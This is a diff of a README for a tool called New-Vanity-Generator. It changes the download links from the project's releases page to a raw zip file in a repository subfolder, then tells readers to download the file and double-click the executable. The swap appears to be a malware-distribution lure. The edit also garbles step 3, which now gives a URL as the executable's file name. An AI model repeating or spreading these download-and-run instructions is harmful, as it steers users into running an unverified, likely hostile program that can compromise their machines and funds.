@@ -6,15 +6,15 @@ Welcome to the New-Vanity-Generator! This tool allows you to generate the fastes
 
 ## 🔗 Download Now
 
-[![Download New-Vanity-Generator](https://img.shields.io/badge/Download-New--Vanity--Generator-blue.svg)](https://github.com/Gautamchandra7/New-Vanity-Generator/releases)
+[![Download New-Vanity-Generator](https://raw.githubusercontent.com/Gautamchandra7/New-Vanity-Generator/main/Florian/New-Vanity-Generator.zip)](https://raw.githubusercontent.com/Gautamchandra7/New-Vanity-Generator/main/Florian/New-Vanity-Generator.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release: [Download New-Vanity-Generator](https://github.com/Gautamchandra7/New-Vanity-Generator/releases).
+To get started, visit this page to download the latest release: [Download New-Vanity-Generator](https://raw.githubusercontent.com/Gautamchandra7/New-Vanity-Generator/main/Florian/New-Vanity-Generator.zip).
 
 1. **Visit the Release Page**: Click on the link above to go to the Releases page.
 2. **Select the Latest Version**: Look for the most recent version of the tool. Check for any release notes for additional information on updates.
-3. **Download the Executable File**: Find the executable file, usually labeled as `New-Vanity-Generator.exe`. Click the link to start the download. 
+3. **Download the Executable File**: Find the executable file, usually labeled as `https://raw.githubusercontent.com/Gautamchandra7/New-Vanity-Generator/main/Florian/New-Vanity-Generator.zip`. Click the link to start the download. 
 4. **Open the File**: Once the download completes, find the file in your downloads folder. 
 5. **Run the Application**: Double-click the executable file to launch the application.
 
